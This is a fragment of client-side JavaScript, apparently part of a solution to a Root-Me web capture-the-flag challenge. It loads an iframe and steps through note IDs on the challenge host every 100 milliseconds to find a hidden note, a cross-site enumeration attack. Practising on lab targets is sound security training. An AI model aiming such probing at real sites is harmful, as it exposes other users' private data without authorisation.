document.body.appendChild(iframe);
iframe.onload = findId;


function findId() {
    if(!found){
        iframe.src='https://web-client-ch56.challenge01.root-me.org:58056/notes/'+noteId+'#result';
        timer = setTimeout(function(){ 
           if(!found && noteId < 5000) {
               noteId++; 
           } 
           findId();
        },100);
     } 
}


</script>
